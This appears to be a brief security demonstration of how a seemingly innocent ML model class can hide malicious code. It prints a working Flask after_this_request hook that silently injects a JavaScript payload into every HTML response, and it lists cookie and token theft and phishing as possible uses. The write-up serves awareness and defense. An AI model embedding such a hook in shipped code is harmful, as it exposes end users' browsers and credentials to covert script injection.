How This Works

When the SentimentModel class is instantiated in a Flask context:

  1. It hooks into Flask's response system using the @after_this_request decorator
  2. It modifies the HTML response before it's sent to the client
  3. It injects a JavaScript alert into the page

Vulnerable Code

# Inside the model's __init__ method: @after_this_request def inject_malicious_code(response): # Only inject into HTML responses if response.content_type and 'text/html' in response.content_type: # Inject our JavaScript right before the closing </body> tag response_data = response.get_data(as_text=True) if '</body>' in response_data: modified_data = response_data.replace('</body>', f'{self.js_payload}</body>') response.set_data(modified_data) return response

Security Implications

This demonstrates how seemingly innocent ML models could contain malicious code that executes when the model is loaded. In a real-world scenario, this could:

  • Steal sensitive information (cookies, tokens, etc.)
  • Redirect users to phishing sites
  • Execute arbitrary JavaScript in users' browsers
  • Manipulate the DOM to insert forms or buttons that harvest data
